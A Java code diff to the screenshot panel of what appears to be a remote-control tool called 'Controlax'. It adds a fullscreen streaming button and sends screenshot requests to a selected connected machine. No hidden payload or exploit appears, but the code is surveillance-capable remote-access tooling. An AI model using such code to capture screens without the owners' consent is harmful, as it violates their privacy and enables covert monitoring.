@@ -22,16 +22,19 @@ public class ScreenshotPanel extends JPanel {
 
 	public static final byte SCREENSHOT_HEADER = 0x21;
 
+	public final FullscreenStream fullscreen;
 	public final JLabel statusLabel;
 	public final JButton takeScreenshotButton;
 	public final JButton viewScreenshotButton;
+	public final JButton fullscreenButton;
 
 	public BufferedImage screenshot;
 	public boolean lastResponse;
 
 	public ScreenshotPanel() {
+		this.fullscreen = new FullscreenStream();
 		this.setBorder(new TitledBorder("Screenshot"));
-		this.setLayout(new GridLayout(3, 1));
+		this.setLayout(new GridLayout(4, 1));
 		this.statusLabel = new JLabel();
 		this.statusLabel.setHorizontalAlignment(SwingConstants.CENTER);
 		this.disconnected();
@@ -45,6 +48,10 @@ public class ScreenshotPanel extends JPanel {
 		this.viewScreenshotButton.addActionListener(Event -> ImageViewerPane.viewImage(this.screenshot, "View Screenshot Image"));
 		this.viewScreenshotButton.setEnabled(false);
 		this.add(this.viewScreenshotButton);
+		this.fullscreenButton = new JButton();
+		this.fullscreenButton.setText("Stream Fullscreen");
+		this.fullscreenButton.addActionListener(Event -> this.fullscreen.show());
+		this.add(this.fullscreenButton);
 		Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
 			try {
 				if(this.lastResponse) {
@@ -56,7 +63,7 @@ public class ScreenshotPanel extends JPanel {
 				this.lastResponse = false;
 				BinaryConfigObject config = new BinaryConfigObject();
 				config.putInt("Action", 0);
-				Controlax.INSTANCE.client.sendPacket(new BinaryConfigPacket(config));
+				Controlax.INSTANCE.selected.sendPacket(new BinaryConfigPacket(config));
 			} catch(Throwable Errors) {
 
 			}
@@ -67,7 +74,7 @@ public class ScreenshotPanel extends JPanel {
 		Controlax.INSTANCE.window.status("Taking the screenshot...");
 		BinaryConfigObject config = new BinaryConfigObject();
 		config.putInt("Action", 3);
-		Controlax.INSTANCE.client.sendPacket(new BinaryConfigPacket(config));
+		Controlax.INSTANCE.selected.sendPacket(new BinaryConfigPacket(config));
 	}
 
 	public void processImagePacket(HeaderedImagePacket packet) {
